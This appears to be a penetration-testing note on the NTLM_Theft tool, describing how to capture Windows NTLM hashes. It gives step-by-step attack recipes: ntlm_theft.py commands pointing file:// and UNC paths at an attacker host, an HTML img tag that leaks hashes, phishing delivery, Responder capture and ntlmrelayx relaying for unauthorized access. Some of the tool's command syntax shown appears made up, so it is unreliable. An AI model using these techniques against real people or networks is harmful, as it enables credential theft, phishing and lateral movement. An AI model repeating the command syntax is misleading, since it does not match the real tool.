### NTLM_Theft Overview
https://github.com/Greenwolf/ntlm_theft

**NTLM_Theft** is a tool designed to facilitate the theft of NTLM hashes using a variety of methods, including `file://`, `UNC paths`, and other techniques that trick a target into authenticating to an attacker's SMB server.

### Use Cases

1. **Embedding a Malicious Link in Documents:**
   - Embedding a `file://` link in a document (Word, Excel, etc.) can force the target to authenticate to your rogue SMB server when they open the document.

2. **Email Phishing:**
   - Sending a phishing email with a `file://` link to an SMB share controlled by the attacker can capture NTLM hashes when the link is clicked.

3. **Web Page Inclusion:**
   - Embedding a malicious image or file in a web page using `file://` or UNC paths can cause the target's browser to authenticate to the attacker's SMB server.

4. **SMB Relay Attacks:**
   - Combining `NTLM_Theft` with tools like `ntlmrelayx`, you can relay captured NTLM hashes to other services like SMB, HTTP, or LDAP to gain unauthorized access.

### Example Commands and Use Cases

#### 1. **Creating a Malicious `file://` Link in a Document**

   - **Command to generate a malicious link:**
     ```bash
     python3 ntlm_theft.py -f "file://attacker-ip/share"
     ```

   - **How to Use:**
     - Generate the link using `ntlm_theft.py`.
     - Embed the link in a Word or Excel document.
     - Send the document to the target via email or other methods.
     - When the target opens the document, their machine attempts to access the file, sending the NTLM hash to the attacker's SMB server.

#### 2. **Embedding a Malicious UNC Path in an Email**

   - **Command to generate a UNC path:**
     ```bash
     python3 ntlm_theft.py -u "\\attacker-ip\share"
     ```

   - **How to Use:**
     - Generate the UNC path using `ntlm_theft.py`.
     - Include the UNC path in the body of a phishing email, such as linking it to a fake document or image.
     - When the target clicks the link, their machine will attempt to connect to the specified UNC path, sending the NTLM hash.

#### 3. **Embedding a Malicious Image on a Web Page**

   - **Command to generate an image link:**
     ```bash
     python3 ntlm_theft.py -f "file://attacker-ip/image.png"
     ```

   - **How to Use:**
     - Embed the generated link in the `<img>` tag of an HTML page.
     - Host the HTML page on a website or send it as part of an HTML email.
     - When the page is viewed, the browser will attempt to load the image from the attacker's SMB server, capturing the NTLM hash.

   - **Example HTML:**
     ```html
     <img src="file://attacker-ip/image.png" alt="Loading Image...">
     ```

see additional note:  TechniquesFor CoercingBrowserAuth
#### 4. **Using NTLM_Theft with `Responder`**

   - **Command:**
     ```bash
     python3 ntlm_theft.py -f "file://attacker-ip/share"
     ```

   - **Setup `Responder` to Capture Hashes:**
     ```bash
     responder -I eth0 -wrf
     ```

   - **How to Use:**
     - Run `Responder` to listen for incoming authentication attempts.
     - Use `ntlm_theft.py` to generate a malicious link and distribute it through one of the above methods.
     - When the target interacts with the link, their NTLM hash will be captured by `Responder`.

#### 5. **SMB Relay Attack Using `ntlm_theft` and `ntlmrelayx`**

   - **Generate a link with `ntlm_theft`:**
     ```bash
     python3 ntlm_theft.py -u "\\attacker-ip\share"
     ```

   - **Set up `ntlmrelayx` to relay captured hashes:**
     ```bash
     python3 ntlmrelayx.py -t smb://target-ip -smb2support
     ```

   - **How to Use:**
     - Configure `ntlmrelayx` to relay captured hashes to another service (e.g., SMB, HTTP).
     - Use `ntlm_theft` to generate and distribute a malicious link.
     - When the target machine authenticates to the attacker's SMB server, `ntlmrelayx` relays the hash to another service, potentially granting unauthorized access.

### Additional Options

- **Customize Output:**
  - You can use `ntlm_theft.py` with various options to customize the output. For example, you can create links for multiple targets or embed them in different types of payloads.

- **Example Command for Multiple Targets:**
  ```bash
  python3 ntlm_theft.py -f "file://attacker-ip/share" -o output_file.txt
  ```

  This command generates the malicious link and saves it to `output_file.txt` for later use.
